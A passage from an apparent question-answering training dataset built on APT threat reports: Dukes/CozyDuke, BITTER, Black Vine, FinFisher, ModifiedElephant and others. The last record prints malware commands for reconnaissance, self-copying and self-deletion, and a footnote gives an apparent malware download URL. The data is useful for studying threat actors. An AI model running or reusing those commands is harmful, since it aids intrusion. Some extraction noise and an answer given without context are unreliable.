    "output": "Mandiant uses the label 'UNC' groups to refer to clusters of intrusion activity that include observable artifacts such as adversary infrastructure, tools, and tradecraft that are not yet ready to be classified under labels like TEMP, APT, or FIN. Mandiant assesses with moderate confidence that UNC3313 is associated with TEMP.Zagros, an Iran-nexus threat actor active since at least May 2017. This assessment is based on the consistent updates to TEMP.Zagros' toolkit over the years, including the use of malware such as POWGOOP and MORIAGENT in spear-phishing operations. The group's use of ScreenConnect for initial compromise is well documented in open sources. Notably, on January 12, 2022, the U.S. government publicly stated that it considers TEMP.Zagros as subordinate to the Iranian Ministry of Intelligence and Security (MOIS) and disclosed samples of malware families (POWGOOP and MORIAGENT) in use by the group since at least 2020. This public statement adds credibility to the association between UNC3313 and TEMP.Zagros and highlights the geopolitical significance of the group's activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: The disappearance of APT3\nWe published our in April and May 2017. It was the first time that the (<https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html>)Chinese Intelligence Services had been conclusively linked to an APT and followed , years previously, linking People's Liberation Army (PLA) Unit 61398 to APT1.\nThe Boyusec website went offline the morning after the exposure and it hasn't been back online since.\nThe morning after, on boyusec.com\nBoyusec disappeared into the shadows without making any effort to contact us or to refute any of the conclusions of our analysis. These were not the actions of innocent individuals.\nWhere did these guys run off to? Perhaps not proud of their work as APT3?\n\u2014 Intrusion Truth (@intrusion_truth)\n\nWhy did the Boyusec website go offline immediately after the exposure of APT3, and what does this indicate about the nature of their activities?",
    "output": "The Boyusec website went offline the morning after the exposure of APT3 and has not been back online since. This immediate action suggests that the individuals behind Boyusec were aware of the exposure and chose to disappear rather than refute the claims or attempt to clear their names. Such behavior is indicative of guilt and aligns with the actions of those involved in illicit activities rather than innocent individuals. This disappearance supports the conclusion that Boyusec was indeed linked to APT3 and involved in cyber espionage activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Remote Work Environment Best Practices\nWith the increased use of remote work environments and VPN services, the FBI and CISA encourage organizations to implement the following best practices to improve network security:\n\u2022 Regularly update VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations.\n\u2022 When possible, implement multi-factor authentication on all VPN connections. Physical security tokens are the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, require employees engaging in remote work to use strong passwords.\n\u2022 Monitor network traffic for unapproved and unexpected protocols.\n\u2022 Reduce potential attack surfaces by discontinuing unused VPN servers that may be used as a point of entry for cyber actors.\nMedium Headline: User Awareness Best Practices\nCyber actors frequently use unsophisticated methods to gain initial access, which can often be mitigated by stronger employee awareness of indicators of malicious activity. The FBI and CISA recommend the following best practices to improve employee operations security when conducting business:\n\u2022 Provide end-user awareness and training. To help prevent targeted social engineering and spearphishing scams, ensure that employees and stakeholders are aware of potential cyber threats and delivery methods. Also, provide users with training on information security principles and techniques.\n\u2022 Inform employees of the risks associated with posting detailed career information to social or professional networking sites.\n\u2022 Ensure that employees are aware of what to do and whom to contact when they see suspicious activity or suspect a cyber incident, to help quickly and efficiently identify threats and employ mitigation strategies.\n\nBased on the above text, answer a question. How can organizations effectively mitigate the risk of Russian state-sponsored cyber actors gaining network access through exploitation of default MFA protocols and known vulnerabilities in remote work environments?",
    "output": "Organizations can mitigate the risk of Russian state-sponsored cyber actors gaining network access by implementing several best practices. Firstly, regularly updating VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations is crucial. Secondly, implementing multi-factor authentication (MFA) on all VPN connections is highly recommended, with physical security tokens being the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, requiring employees to use strong passwords is essential. Additionally, monitoring network traffic for unapproved and unexpected protocols helps in detecting unusual activities. Lastly, reducing potential attack surfaces by discontinuing unused VPN servers that could serve as entry points for cyber actors is important.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2015: The Dukes up the ante\nThe end of January 2015 saw the start of the most high-volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke. Curiously, the spear-phishing emails were strikingly similar to the e-fax themed spam usually seen spreading ransomware and other common crimeware. Due to the sheer number of recipients, it may not have been possible to customize the emails in the same way as was possible with lower-volume campaigns.\nThe similarity to common spam may however also serve a more devious purpose. It is easy to imagine a security analyst, burdened by the amount of attacks against their network, dismissing such common-looking spam as \"just another crimeware spam run\", allowing the campaign to, in essence, hide in the masses.\nThe CozyDuke activity continues one of the long-running trends of the Dukes operations, the use of multiple malware toolsets against a single target. In this case, the Dukes first attempted to infect large numbers of potential targets with CozyDuke (and in a more obvious manner than previously seen). They would then use the toolset to gather initial information on the victims, before deciding which ones to pursue further. For the victims deemed interesting enough, the Dukes would then deploy a different toolset.\nWe believe the primary purpose of this tactic is an attempt at evading detection in the targeted network. Even if the noisy initial CozyDuke campaign is noticed by the victim organization, or by someone else who then makes it publicly known, defenders will begin by first looking for indicators of compromise (IOCs) related to the CozyDuke toolset. If however by that time the Dukes are already operating within the victim's network, using an another toolset with different IOCs, then it is reasonable to assume that it will take much longer for the victim organization to notice the infiltration.\nIn previous cases, the group used their malware toolsets interchangeably, as either the initial or a later-stage toolset in a campaign. For these CozyDuke campaigns however, the Dukes appear to have employed two particular later-stage toolsets, SeaDuke and HammerDuke, that were purposely designed to leave a persistent backdoor on the compromised network. HammerDuke is a set of backdoors that was first seen in the wild in February 2015, while SeaDuke is a cross-platform backdoor that was, according to Symantec, first spotted in the wild in October 2014 . Both toolsets were originally spotted being deployed by CozyDuke to its victims.\nWhat makes SeaDuke special is that it was written in Python and designed to work on both Windows and Linux systems; it is the first cross-platform tool we have seen from the Dukes. One plausible reason for developing such a flexible malware might be that the group were increasingly encountering victim environments where users were using Linux as their desktop operating system.\nMeanwhile, HammerDuke is a Windows-only malware (written in .NET) and comes in two variants. The simpler one will connect to a hardcoded C&C server over HTTP or HTTPS to download commands to execute. The more advanced variant, on the other hand, will use an algorithm to generate a periodically-changing Twitter account name and will then attempt to find tweets from that\n4 17 19 +23+ 21\nIMAGE 7: FLOWCHART OF HOW ONIONDUKE USES MALICIOUS TOR NODE TO INFECT VICTIMS\nIMAGE 8: GEOGRAPHICAL DISTRIBUTION OF ONIONDUKE BOTNET\nTOTAL: 1389\n3% EACH\nEGYPT, 43\nUSA, 39\nTURKEY, 38\nINDONESIA, 34 SAUDI ARABIA, 25 BRAZIL, 22 2% EACH\n1% EACH\nPHILIPPINES, 16 SRI LANKA, 15 BANGLADESH, 14 NEPAL, 13 CAMBODIA, 13 CHINA, 12\nIMAGE 9: ONIONDUKE C&C TWEET\nScreenshot of a tweet intended for OnionDuke, with a link pointing to an image file that embeds an updated version of OnionDuke\naccount containing links to the actual download location of the commands to execute. In this way, the advanced HammerDuke variant attempts to hide its network traffic in more legitimate use of Twitter. This method is not unique to HammerDuke, as MiniDuke, OnionDuke, and CozyDuke all support similar use of Twitter (image 9, above) to retrieve links to additional payloads or commands.\n2015: CloudDuke\nIn the beginning of July 2015, the Dukes embarked on yet another large-scale phishing campaign. The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the first time that this toolset was deployed by the Dukes, other than possible small-scale testing.\nThe CloudDuke toolset consists of at least a loader, a downloader, and two backdoor variants. Both backdoors (internally referred to by their authors as \"BastionSolution\" and \"OneDriveSolution\") essentially allow the operator to remotely execute commands on the compromised machine. The way in which each backdoor does so however is significantly different. While the BastionSolution variant simply retrieves commands from a hard-coded C&C server controlled by the Dukes, the OneDriveSolution utilizes Microsoft's OneDrive cloud storage service for communicating with its masters, making it significantly harder for defenders to notice the traffic and block the communication channel. What is most significant about the July 2015 CloudDuke campaign is the timeline. The campaign appeared to consist of two distinct waves of spear-phishing, one during the first days of July and the other starting from the 20th of the month. Details of the first wave, including a thorough technical analysis of CloudDuke, was published by Palo Alto Networks on 14th July . This was followed by additional details from Kaspersky in a blog post published on 16th July (<>)[17] .\nBoth publications happened before the second wave took place and received notable publicity. Despite the attention and public exposure of the toolset's technical details (including IOCs) to defenders, the Dukes still continued with their second wave of spear-phishing, including the continued use of CloudDuke. The group did change the contents of the spear-phishing emails they\nsent, but they didn't switch to a new email format; instead, they reverted to the same efax-themed format that they had previously employed, even to the point of reusing the exact same decoy document that they had used in the CozyDuke campaign a year earlier (July 2014).\nThis once more highlights two crucial behavioral elements of the Dukes group. Firstly, as with the MiniDuke campaigns of February 2013 and CosmicDuke campaigns in the summer of 2014, again the group clearly prioritized the continuation of their operations over maintaining stealth. Secondly, it underlines their boldness, arrogance and self-confidence; they are clearly confident in both their ability to compromise their targets even when their tools and techniques are already publicly known, and critically, they appear to be extremely confident in their ability to act with impunity.\n2015: Continuing surgical strikes with CosmicDuke\nIn addition to the notably overt and large-scale campaigns with CozyDuke and CloudDuke, the Dukes also continued to engage in more covert, surgical campaigns using CosmicDuke. The latest of these campaigns that we are aware of occurred during the spring and early summer of 2015. As their infection vectors, these campaigns used malicious documents exploiting recently fixed vulnerabilities.\nTwo of these campaigns were detailed in separate blog posts by the Polish security company Prevenity, who said that both campaigns targeted Polish entities with spear-phishing emails containing malicious attachments with relevant Polish language names . A third, similar, CosmicDuke campaign was observed presumably targeting Georgian entities since it used an attachment with a Georgian-language name that translates to \"NATO consolidates control of the Black Sea.docx\".\nBased on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. Instead, we believe that they are simply expanding their activities by adding new tools and techniques.\nIMAGE 10: TIMELINE OF KNOWN ACTIVITY FOR  THE VARIOUS DUKE TOOLKITS\n2007\nBig Headline: TOOLS AND TECHNIQUES OF THE DUKES\nThe PinchDuke toolset consists of multiple loaders and a core information stealer trojan. The loaders associated with the PinchDuke toolset have also been observed being used with CosmicDuke.\nThe PinchDuke information stealer gathers system configuration information, steals user credentials, and collects user files from the compromised host transferring these via HTTP(S) to a C&C server. We believe PinchDuke's credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums.\nCredentials targeted by PinchDuke include ones associated with the following software or services:\n\u2022 The Bat!\n\u2022 Yahoo!\n\u2022 Mail.ru\n\u2022 Passport.Net\n\u2022 Google Talk\n\u2022 Netscape Navigator\n\u2022 Mozilla Firefox\n\u2022 Mozilla Thunderbird\n\u2022 Internet Explorer\n\u2022 Microsoft Outlook\n\u2022 WinInet Credential Cache\n\u2022 Lightweight Directory Access Protocol (LDAP)\nAs a curiosity, most PinchDuke samples contain a Russian language error message:\n\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u044f \u043c\u043e\u0434\u0443\u043b\u044f! \u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0441\u0435\u043a\u0446\u0438\u0438 \u0434\u0430\u043d\u043d\u044b\u0445 \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c 4 \u0431\u0430\u0439\u0442\u0430!\"\nWhich roughly translates to:\n\"There is an error in the module's name! The length of the data section name must be 4 bytes!\"\nPinchDuke will also search for files that have been created within a predefined timeframe and whose file extension is present in a predefined list.\n\nBased on the above text, answer a question. Why did the Dukes use a high-volume spear-phishing campaign with CozyDuke in January 2015, and what was the strategic advantage of employing this tactic?",
    "output": "The Dukes used a high-volume spear-phishing campaign with CozyDuke in January 2015 to target thousands of recipients with emails similar to common crimeware spam. This tactic served multiple purposes. Firstly, due to the sheer volume of recipients, it was challenging to customize each email, making it easier to blend in with typical spam. Secondly, the similarity to common spam could lead security analysts to dismiss these emails as routine, allowing the campaign to go unnoticed amidst the noise. The primary purpose of this tactic was to evade detection by initially using CozyDuke to gather information and then switching to a different toolset for deeper infiltration. This way, even if the initial CozyDuke campaign was detected, defenders would look for CozyDuke-related indicators of compromise (IOCs), giving the Dukes time to operate undetected with a different toolset.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Appendix \u2014 Gauging confidence level\nCTU researchers have adopted the grading system published by the U.S. Office of the Director of National Intelligence to indicate confidence in their assessments:\nHigh confidence generally indicates that judgments are based on high-quality information, and/or that the nature of the issue makes it possible to render a solid judgment. A \"high confidence\" judgment is not a fact or a certainty, however, and such judgments still carry a risk of being wrong.\nModerate confidence generally means that the information is credibly sourced and plausible but not of sufficient quality or corroborated sufficiently to warrant a higher level of confidence.\nLow confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources.\n[1] The SecureWorks Counter Threat Unit (CTU) research team tracks threat groups by assigning them four-digit randomized numbers (4127 in this case), and compiles information from external sources and from first-hand incident response observations.\n\nHow does the SecureWorks Counter Threat Unit (CTU) determine the confidence levels of their assessments regarding threat groups like TG-4127? Explain the criteria for each level of confidence.",
    "output": "The SecureWorks Counter Threat Unit (CTU) uses a grading system published by the U.S. Office of the Director of National Intelligence to indicate confidence in their assessments. High confidence indicates that judgments are based on high-quality information and/or that the nature of the issue allows for a solid judgment, although it is not a certainty and still carries a risk of being wrong. Moderate confidence means that the information is credibly sourced and plausible but not of sufficient quality or corroboration to warrant a higher level of confidence. Low confidence means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or there are significant concerns or problems with the sources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: BACKGROUND\nIn September 2021, SentinelLabs published research into the operations of a Turkish-nexus threat actor we called , drawing attention to their practice of planting incriminating evidence on the systems of journalists to justify arrests by the Turkish National Police. A threat actor willing to frame and incarcerate vulnerable opponents is a critically underreported dimension of the cyber threat landscape that brings up uncomfortable questions about the integrity of devices introduced as evidence. Emerging details in an  caught our attention as a potentially similar scenario worthy of more scrutiny.\nLong-standing racial and political tensions in India were inflamed on January 1st, 2018 when critics of the government clashed with pro-government supporters near . The event led to subsequent protests, resulting in more violence and at least one death.\nIn the following months, Maharashtra police linked the cause of the violence to the banned Naxalite-Maoist Communist party of India. On April 17th, 2018, police conducted raids and arrested a number of individuals on terrorism-related charges. The arresting agencies identified incriminating files on the computer systems of defendants, including plans for an alleged assassination attempt against Prime Minister Modi.\nThanks to the public release of digital forensic investigation results by Arsenal Consulting and those referenced below, we can glean rare insights into the integrity of the systems of some defendants and grasp the origin of the incriminating files. It turns out that a compromise of defendant systems led to the  that were later used as evidence of terrorism and justification for the defendants' imprisonment. The intrusions in question were not isolated incidents.\nOur research into these intrusions revealed a decade of persistent malicious activity targeting specific groups and individuals that we now attribute to a previously unknown threat actor named ModifiedElephant. This actor has operated for years, evading research attention and detection due to their limited scope of operations, the mundane nature of their tools, and their regionally-specific targeting. ModifiedElephant is still active at the time of writing.\nRead the text above and answer this question: How did the threat actor ModifiedElephant manage to evade detection for a decade despite their persistent malicious activities? Explain the factors that contributed to their ability to remain undetected.",
    "output": "ModifiedElephant managed to evade detection for a decade due to several key factors. Firstly, their limited scope of operations meant they targeted specific groups and individuals, reducing their overall visibility. Secondly, the mundane nature of their tools made it difficult for security researchers to distinguish their activities from routine cyber threats. Lastly, their regionally-specific targeting further narrowed the focus of their operations, making it less likely for broader cybersecurity communities to notice their activities. These combined factors allowed ModifiedElephant to operate under the radar for an extended period.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Oman: Eagle Eye Digital Solutions LLC\nWe found a FinFisher server running on IP address 37.139.27.xxx, which is pointed to by two subdomains of to70.org, a domain\nname associated with an Omani company called \"Eagle Eye Digital Solutions LLC\" through historical WHOIS. The domain is currently registered to \"Omantel,\" the largest telecom in Oman. Eagle Eye Digital Solutions LLC was founded by, and is run by, Warith Al\u00adMaawali. Leaked emails describe Warith as part of Oman's Ministry of Interior, as well as a reseller of FinFisher products. Other sites apparently run by Eagle Eye include a major Omani online forum, \"oman0.net.\" Eagle Eye founder Warith Al Maawali says the forum is \"one of the most active sites with the largest user\u00adbase in Oman.\"\nAn archived version of Eagle Eye's website on the Wayback Machine showed Elaman GmbH as one of their partners, and \"Security Organizations\" as their clients. Elaman is known to be a reseller of FinFisher products.\nBig Headline: Conclusion\nIn this report we provided the first update on Citizen Lab's previous FinFisher scanning work since a widely discussed 2014 hack of FinFisher. Despite the disclosure of sensitive customer data in that hack, and the potential customer concerns this might cause, our latest scans have detected FinFisher servers in more countries than any previous round of scanning.\nFinFisher is still being used by a number of previously identified government clients, including Ethiopia, which is the defendant in an ongoing lawsuit over previous FinFisher use. We have also identified newly identified suspected customers, including: Angola, Egypt, Gabon, Jordan, Kazakhstan, Kenya, Lebanon, Morocco, Oman, Paraguay, Saudi Arabia, Slovenia, Spain, Taiwan, Turkey, and Venezuela.\nWhile we may not be detecting all FinFisher installations, this report's methods improved on both our ability to detect installations, and to attribute FinFisher servers to specific governmental customers, whom we named. A key goal of this research is to provide a resource to those working on policy and research in this space. We also believe this kind of reporting is essential to help ensure that citizens have the opportunity to hold their governments accountable. To this end, we identify government users, but redact certain details about live infrastructure (like removing the last octet of IP addresses), whose disclosure might interfere with legitimately sanctioned activities.\nMedium Headline: The Global Intrusion Software Market: Difficult to Study, Tricky to Regulate\nThe market for intrusion software like FinFisher is challenging to track because the key players, from government customers to\nsoftware developers, have a strong interest in keeping transactions private. However, several years of research, reporting, and revelations have made it clear that a growing list of countries have acquired, or are seeking these tools.\nAs customer lists grow, so should concern over the documented abuse potential of intrusion software. Some governments clearly believe that it can be used, with proper oversight, in the service of legitimate criminal investigations and intelligence gathering. However, there are also well documented cases in which government customers have abused intrusion software to compromise political opponents within their borders, and overseas.\nThe current market seems to bypass some historic limits on the spread of advanced technical intrusion capabilities. Lack of a strong Science, Technology, Engineering and Mathematics (STEM) education, or absence of long term investment in research and development pipelines, are no longer impediments to obtaining computer exploitation and intrusion capabilities. These tools are now available for purchase by any government. Certainly, lack of development in STEM should not preclude a country from having access to sophisticated investigative tools. Indeed, an under\u00adresourced state is likely to face security challenges that are just as serious as a more developed one.\nHowever, it can be difficult even for democratic governments with a strong rule of law to oversee secret investigative capabilities like intrusion software. These tools are likely to be acquired and used by divisions that are professionally discreet in their budgeting and information sharing. The information they generate may also have its origins deliberately disguised before being shared with other departments or agencies. Intrusion software presents a challenge for accountability in any country, and the oversight authorities in under\u00adresourced countries facing domestic or international security threats may be particularly ill\u00adequipped in expertise and political clout, to identify or act on signs of misuse.\nPrevious research has shown that FinFisher has been used to target regime opponents in several cases. Notably, FinFisher has been used to hack Ethiopian and Bahraini democracy activists and opposition political figures. Meanwhile, research and revelations about Hacking Team's Remote Control System (RCS), a competitor product, have also made it clear that some government customers used these tools to target their political opponents, rather than security threats to their citizens.\nDespite the well documented potential for abuse, the companies who develop and market these capabilities are reluctant and ill\u00adequipped to conduct rigorous due diligence about potential customers, as recent revelations about Hacking Team have made clear.\nThe Wassenaar Arrangement, which regulates the export of weapons, as well as \"dual use\" technologies, was amended in 2013 to include items related to intrusion software, like FinFisher and Hacking Team's RCS. Now, as participants like the European Union have undertaken their own implementations (or are still developing theirs as in the case of the United States), it remains to be seen whether or not this will lead to greater transparency and control, and what impact, if any, it will have on abusive surveillance.\nWe hope that continued evidence\u00adbased research of this sort will contribute to greater overall transparency about this market, and provide much\u00adneeded points of reference for policy making and tracking the impact of regulatory efforts.\nBig Headline: Footnotes\n1 2 3 4 5 6 7 Id.\n8 Id.\n9 10 11 12 Google does not return the user's IP address unless a certain type of \"User\u00adAgent\" header is included. In this example, we include a user agent used by the Tor Browser Bundle. The \"nord=1\" parameter turns off Google's SSL redirection.\n13 Yahoo does not return the userLocation object unless a certain type of \"User\u00adAgent\" header is included. In some cases, we needed to substitute a country\u00adspecific version of Yahoo in the GET request (either espanol.yahoo.com or maktoob.yahoo.com).\n14 We verified that the IP of our measurement machine was included in the Libero cookie when visiting the libero.it site directly.\n15 16 17 See our previous fingerprints: (<https://github.com/citizenlab/spyware-scan/blob/master/ff/fingerprint-2.0.txt>)https://github.com/citizenlab/spyware\u00adscan/blob/master/ff/fingerprint\u00ad2.0.txt, (<https://github.com/citizenlab/spyware-scan/blob/master/ff/fingerprint-4.0.txt>), https://github.com/citizenlab/spyware\u00adscan/blob/master/ff/fingerprint\u00ad4.0.txt\n18 We assume that if a FinFisher master is located in a country, then an entity of that country's government is using the spyware. It is of course possible that government entities may be operating some surveillance from overseas sites. Though, we view this possibility as quite remote, given concerns about relying on foreign (and potentially untrusted) telecom infrastructure to operate surveillance infrastructure.\n19 20 See for example: (<http://2014.hack.lu/archive/2014/inside_spying_v1.4.pdf>)http://2014.hack.lu/archive/2014/inside_spying_v1.4.pdf and (<https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-marczak.pdf>)https://www.usenix.org/system/files/conference/usenixsecurity14/sec14\u00adpaper\u00admarczak.pdf\n21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 http://ceas\u00ad\n39 40 41 42 43 44 45 46 47 48 49 51 52 54 56 57 58 59 61 62 63 64 66 67 68 69 71 72 74\n76 77 78 79 81 82 83 84 http://youm7.news\u00adyoum7.com/youm7/videos/acrobat\u00adreader.rar\n86 87 88 89\n\nQuestion: What challenges exist in regulating the market for intrusion software like FinFisher, and how do these challenges affect under-resourced states?\n\nAnswer:",
    "output": "The market for intrusion software is challenging to track because key players, including government customers and software developers, have a strong interest in keeping transactions private. This lack of transparency makes it difficult to oversee the use of these tools, even for democratic governments with a strong rule of law. Under-resourced states may face particular difficulties in identifying or acting on signs of misuse due to a lack of expertise and political clout. Previous research has shown that FinFisher has been used to target regime opponents in several cases, highlighting the potential for abuse.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What insights can be drawn from the PDB path found in the 'MyHNServer' malware sample, and how does it relate to other activities by the actor using htpRAT?",
    "output": "The PDB path found in the 'MyHNServer' malware sample includes the folder name '\u5df4\u54e5\u7ec4,' which translates to 'elderly' or 'brother' group, likely referring to a senior or experienced group within the attacker's organization. This PDB path correlates with other samples, including 'MyCL,' which uses the C2 server 'data.dubkill.com.' This domain has been used in attacks in Vietnam and is registered to an email address linked to other malicious activities, such as imitating the official military domain in Vietnam. The shared infrastructure and registration information reveal a broader web of operations by the adversary, highlighting the extent and complexity of their activities beyond the use of htpRAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Topsec association\nnoted that the registration information for infrastructure used in the Anthem breach leads back to a Chinese origin. Infrastructure associated with the Mivast malware sample (MD5:230D8 A7A60A07DF28A291B13DDF3351F) seen in the Anthem attacks resolved to IP address 192.199.254.126. The domain topsec2014.com was one of only a few domains hosted on this IP address close to the same time frame that Mivast accessed C&C infrastructure hosted on the same IP address.\nThe topsec2014. com domain can be traced back to the registrant address topsec2014@163.com, which is believed to be associated with the similar email address TopSec_2014@163.com. The topsec2014 domain and the previously mentioned email addresses are associated with an organization called Topsec.\nFigure 4. Details on the Topsec Network Security & Technology Company\nTopsec is a company that began as a research institute in Beijing and has since expanded to nearly every province of China. The organization focuses on security research, training, auditing, and products. Its customers include private businesses as well as public agencies. It also hosts an annual hacking competition known as the Topsec Cup and has reportedly hired known hackers to provide security services and training.\nMedium Headline: Zero-day access and distribution\nMultiple Black Vine campaigns have exploited previously unknown zero-day vulnerabilities to deliver the group's custom payload. Zero-day exploits typically require attackers to have an advanced skillset to identify and then determine how to exploit the unheard-of vulnerability. Generally, these exploits can be purchased through underground networks or may be created by specialized exploit developers. Both approaches require access to extensive financial resources.\nIn the case of Black Vine, Symantec has identified a pattern between this attack group's activity and other cyberespionage-related campaigns. These campaigns were seen using the same zero-day exploits but delivering a different payload. There appears to be shared access to zero-day exploits, which are distributed and used within days of one another among different attack groups, as the diagram in Figure 5 shows.\nSmall Headline: Concurrent CVE-2012-4792 zero-day exploits\nIn late December 2012, the Council on Foreign Relations' (CFR) website was compromised. The domain was reported as serving an exploit against an unknown vulnerability found in Internet Explorer 6, which was eventually labelled CVE-2012-4792. At the time of exploitation, there was no patch or remediation in place for the vulnerability, leaving victims using the vulnerable version of Internet Explorer helpless. Once the unpatched vulnerability was exploited, the attackers delivered a variant of  to the victim's computer. Based on Symantec's previous findings, Bifrose has been associated with another cyberespionage campaign. Symantec does not believe that either this adversary or the CFR compromise is associated with Black Vine.\nFigure 5. Zero-day distribution and framework\nAs mentioned previously in this report, in December 2012, the Capstone Turbine website was compromised by Black Vine. Based on the first known instances where malicious code was spotted on both the CFR and Capstone websites, the attacks began on or around the same week as one another.\nIn both website compromises, the domains were serving exploits against the same Internet Explorer zero-day\nvulnerability (CVE-2012-4792). The primary difference between the attacks was that the Sakurel payload was delivered in the Capstone attack while Bifrose was distributed in the CFR attack.\n\nWhat role do zero-day exploits play in Black Vine's cyberespionage campaigns? How does the group acquire and distribute these exploits, and what does this indicate about their capabilities and resources?",
    "output": "Zero-day exploits play a crucial role in Black Vine's cyberespionage campaigns, allowing the group to deliver custom payloads by exploiting previously unknown vulnerabilities. These exploits require advanced skillsets to identify and exploit, indicating that Black Vine has access to either specialized exploit developers or underground networks where such exploits can be purchased. Both approaches necessitate extensive financial resources. Symantec has observed a pattern where Black Vine shares access to zero-day exploits with other cyberespionage groups, distributing and using these exploits within days of one another. For example, in December 2012, both the Council on Foreign Relations (CFR) and Capstone Turbine websites were compromised using the same zero-day vulnerability (CVE-2012-4792), but different payloads were delivered (Bifrose and Sakurel, respectively). This shared access suggests coordination and collaboration among different attack groups, highlighting the sophisticated nature of Black Vine's operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Infection Vector\nSpear-phishing emails are used to target prospective BITTER victims. The campaign predominantly used the older, relatively popular Microsoft Office exploit, (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-0158>)CVE-2012-0158, in order to download and execute a RAT binary from a website. Below is an example of a spear-phishing email they used earlier this month. The recipient is an individual from a government branch in Pakistan, while the sender purports to be coming from another government branch of Pakistan:\nOther attachment filenames they used that also contained the CVE-2012-0158 exploit are as follows:\nRequirement List.doc\nCyber Espionage Prevention.doc\nNew email guidelines.doc\nGazala-ke-haseen-nagme.doc\nRules.xls\nIn one instance, they used a RAR SFX dropper that drops both their RAT and a picture of a Pakistani woman as a decoy. A quick Google image search on the dropped picture indicates that the picture was grabbed from Pakistani dating sites.\n\nQuestion: Why did the BITTER APT group choose to use the CVE-2012-0158 exploit in their spear-phishing campaigns, and how does this choice reflect their strategy and the vulnerabilities they aimed to exploit?\n\nAnswer:",
    "output": "The BITTER APT group chose to use the CVE-2012-0158 exploit in their spear-phishing campaigns because it is an older, well-known vulnerability that targets Microsoft Office applications. This choice reflects their strategy of leveraging widely recognized and potentially unpatched vulnerabilities to increase the likelihood of successful exploitation. By using this exploit, they aimed to download and execute a Remote Access Trojan (RAT) binary from a website, allowing them to gain unauthorized access to the victim's system. The use of such an exploit indicates that the attackers were targeting systems that might not have been updated with the latest security patches, highlighting the importance of regular software updates and patch management in defending against such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What evidence supports the assessment that the Winnti umbrella is associated with the Chinese state intelligence apparatus? How do the attacker TTPs, observed attack infrastructure, and links to previously published intelligence contribute to this conclusion?",
    "output": "The assessment that the Winnti umbrella is associated with the Chinese state intelligence apparatus is supported by several pieces of evidence. Firstly, the attacker TTPs (tactics, techniques, and procedures) align with those commonly used by Chinese state-sponsored actors. Secondly, the observed attack infrastructure shows characteristics consistent with Chinese state-backed operations. Additionally, links to previously published intelligence reports further corroborate this association. The overlap in TTPs, infrastructure, and tooling with other Chinese-speaking threat actors suggests a sharing of resources within the Chinese intelligence community. Moreover, the major reorganization of the People's Liberation Army of China (PLA) in 2015, which included the creation of the Strategic Support Force (SSF), provides context for the observed overlap among groups. Key incident details, such as attacker mistakes revealing locations in the Xicheng District of Beijing, also support this assessment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Main\nThe main procedure starts from creating a temp file to store preliminary tool report. After that it lists all files in \"Program Files\" folder which are newer than hardcoded date: 22 November 1963.\nIt collects environment variables from the following list:\n%PROGRAMDATA%\n%COMPUTERNAME%\n%OS%\n%PROCESSOR_ARCHITECTURE%\n%PROCESSOR_IDENTIFIER%\n%PROCESSOR_LEVEL%\n%NUMBER_OF_PROCESSORS%\n%USERDOMAIN%\n%USERNAME%\n%TIME%\n%PATH%\nAfter that the tool collects list of running processes, which includes executable name and process ID.\nCollected data is then prepended with a header and moved to the following file:\n%SYSTEMDRIVE%:\\ProgramData\\Adobe\\AdobeArm\\sysdll2.txt\nOne of the resources has mysterious icon of the application:\nBig Headline: Main\nThe main procedure is very simple and includes creating a command line for cmd.exe:\ncmd.exe /c ipconfig /all > %SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\netres.txt && arp -a >> %SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\netres.txt\nThis commands will collect information about local network IP address and subnet of current computer, as well as DNS servers, domain name anfooter.jpg.idbd dump ARP table, which contains temporary records of IP and MAC addresses of local network computers.\nThe module attempts to self-delete after execution by calling \"cmd.exe /c del <ModulePath>\" command.\nBig Headline: Main\nOddly, the module concatenates a couple of strings to run commands with cmd.exe and copy itself with several names, to several locations, with its final location residing in the All Users\\Application Data directory and a run key for itself added. First, it concats the string and copies itself to \"C:\\Documents and Settings\\All Users\\Application Data\\a-t_name.exe\". Then, it uses script commands to apply hidden attributes and further copy itself:\ncmd.exe /c cd C:\\Documents and Settings\\All 